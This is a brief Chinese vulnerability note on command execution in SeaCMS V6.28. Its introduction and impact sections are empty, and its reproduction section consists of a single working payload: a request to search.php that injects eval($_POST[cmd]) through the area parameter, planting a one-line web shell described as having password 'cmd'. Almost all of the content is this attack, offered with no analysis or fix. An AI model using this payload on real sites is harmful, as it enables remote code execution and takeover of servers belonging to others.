# 海洋CMS Seacms V6.28 命令执行

### 一、漏洞简介

### 二、漏洞影响

### 三、复现过程

一句话payload，密码cmd:


```
http://url/search.php?searchtype=5&tid=&area=eval($_POST[cmd])
```